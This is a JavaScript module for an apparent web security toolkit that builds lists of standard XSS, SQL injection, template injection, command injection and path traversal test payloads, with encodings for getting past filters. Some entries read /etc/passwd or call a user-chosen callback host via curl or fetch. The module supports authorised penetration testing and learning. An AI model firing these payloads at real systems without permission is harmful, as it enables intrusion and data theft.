import { h, field, input, select, row, output, note, warn, copyText, enc, toB64 } from '../assets/js/ui.js';

// MARK is replaced by the marker field. Standard, well-known test strings.
const LIB = {
  'XSS': [
    '<script>alert(MARK)</script>',
    '"><script>alert(MARK)</script>',
    '<img src=x onerror=alert(MARK)>',
    '<svg onload=alert(MARK)>',
    "javascript:alert(MARK)",
    '<body onload=alert(MARK)>',
    '<iframe src="javascript:alert(MARK)">',
    '"><img src=x onerror=fetch(MARK)>',
    '<details open ontoggle=alert(MARK)>',
  ],
  'SQL injection': [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "admin' -- ",
    "' UNION SELECT NULL-- ",
    "') OR ('1'='1",
    "1' ORDER BY 1-- ",
    "' AND SLEEP(5)-- ",
    "'; WAITFOR DELAY '0:0:5'-- ",
    "' OR 1=1 LIMIT 1-- ",
  ],
  'SSTI': [
    '{{7*7}}',
    '${7*7}',
    '#{7*7}',
    '{{7*"7"}}',
    '<%= 7*7 %>',
    '{{config}}',
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    '${T(java.lang.Runtime).getRuntime()}',
  ],
  'Command injection': [
    '; id',
    '| id',
    '|| id',
    '&& id',
    '`id`',
    '$(id)',
    '; ping -c 1 MARK',
    '%0a id',
    "| curl MARK",
  ],
  'Path traversal / LFI': [
    '../../../../etc/passwd',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '/etc/passwd%00',
    '..\\..\\..\\windows\\win.ini',
    'php://filter/convert.base64-encode/resource=index.php',
    'file:///etc/passwd',
    'expect://id',
  ],
};

const transforms = {
  'none': s => s,
  'URL encode': s => encodeURIComponent(s),
  'URL encode (all)': s => [...s].map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''),
  'Double URL': s => encodeURIComponent(encodeURIComponent(s)),
  'Base64': s => toB64(enc.encode(s)),
  'HTML entity': s => [...s].map(c => '&#' + c.charCodeAt(0) + ';').join(''),
  'Unicode \\u': s => [...s].map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join(''),
};

export default {
  id: 'payloads', cat: 'web', tier: 'a',
  title: 'Payload builder',
  desc: 'XSS, SQLi, SSTI, command, LFI, with encodings',
  render(root) {
    const cat = select(Object.keys(LIB));
    const mark = input({ value: '1' });
    const tf = select(Object.keys(transforms));
    const listEl = h('div');
    const build = () => {
      listEl.innerHTML = '';
      const t = h('table', { class: 'kv' });
      for (const raw of LIB[cat.value]) {
        const sub = raw.replace(/MARK/g, mark.value);
        const outv = transforms[tf.value](sub);
        t.append(h('tr', {},
          h('td', { class: 'mono' }, outv),
          h('td', { style: 'width:52px;text-align:center' }, h('button', { class: 'copy', onclick: () => copyText(outv) }, 'copy'))));
      }
      listEl.append(t);
    };
    [cat, mark, tf].forEach(el => el.addEventListener('input', build));
    cat.addEventListener('change', build); tf.addEventListener('change', build);
    root.append(
      warn('For authorised testing and learning only. These are detection/test strings, run them only against systems you own or may test.'),
      row(field('category', cat), field('marker (replaces MARK)', mark), field('encoding', tf)),
      note('MARK marks where a value goes, e.g. an alert id or your callback host.'),
      listEl);
    build();
  },
};
